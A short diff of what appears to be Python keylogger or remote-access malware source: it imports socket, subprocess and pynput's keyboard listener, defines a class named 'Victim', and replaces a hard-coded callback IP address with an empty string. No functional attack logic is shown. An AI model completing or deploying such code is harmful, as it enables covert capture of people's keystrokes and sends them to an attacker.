@@ -1,7 +1,7 @@
 import subprocess
 import socket
 from pynput import keyboard
-YOUR_IP = "109.119.229.213"
+YOUR_IP = ""
 class Victim():
     def __init__(self):
         
